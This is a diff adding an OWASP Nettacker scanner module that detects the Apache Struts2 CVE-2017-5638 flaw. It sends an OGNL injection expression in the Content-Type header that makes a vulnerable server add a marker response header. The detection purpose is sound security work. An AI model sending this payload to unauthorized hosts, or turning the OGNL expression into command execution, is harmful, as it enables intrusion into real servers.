@@ -1,0 +1,48 @@
+info:
+  name: apache_struts_cve_2017_5638
+  author: OWASP Nettacker Team, Gaurav Sharma
+  severity: 9
+  description: Detects Apache Struts2 CVE-2017-5638 (S2-045) via OGNL injection in Content-Type header.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
+    - https://struts.apache.org/docs/s2-045.html
+  profiles:
+    - vuln
+    - http
+    - critical
+    - apache_struts
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 5
+        data:
+          test: "1"
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "%{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test-S2','vuln')}}.multipart/form-data"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8443
+        response:
+          condition_type: and
+          conditions:
+            headers:
+              X-Test-S2:
+                regex: vuln
+                reverse: false
